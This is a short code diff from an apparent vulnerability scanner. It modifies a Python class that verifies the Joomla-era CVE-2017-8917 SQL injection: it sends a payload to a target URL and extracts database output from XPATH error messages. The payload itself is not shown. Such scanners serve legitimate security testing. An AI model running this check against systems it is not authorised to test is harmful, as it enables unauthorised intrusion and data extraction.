@@ -5,9 +5,8 @@ description: CVE-2017-8917 SQL注入漏洞
 '''
 
 import re
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class CVE_2017_8917_BaseVerify:
     def __init__(self, url):
@@ -21,7 +20,7 @@ class CVE_2017_8917_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            check_req = requests.get(self.url + self.payload, headers = self.headers, allow_redirects = False, verify=False)
+            check_req = request.get(self.url + self.payload, headers = self.headers)
             if 'XPATH syntax error:' in check_req.text:
                 pattern = re.compile('<span class="label label-inverse">500</span>(.*?)</blockquote>')
                 cmd_result = pattern.findall(check_req.text)[0]
